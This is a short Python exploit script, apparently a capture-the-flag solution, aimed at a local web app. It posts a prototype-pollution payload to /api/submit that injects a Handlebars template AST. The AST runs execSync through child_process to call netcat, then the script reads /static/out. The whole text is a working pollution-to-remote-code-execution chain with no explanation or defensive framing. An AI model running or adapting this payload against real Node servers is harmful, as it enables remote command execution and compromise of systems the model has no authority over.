import requests


TARGET_URL =  'http://127.0.0.1:1337'

# make pollution
r = requests.post(TARGET_URL+'/api/submit', json = {
    "artist.name":"Gingell",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync('nc 127.0.0.1 9001')"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
    })

print(r.status_code)
print(r.text)

print(requests.get(TARGET_URL+'/static/out').text)
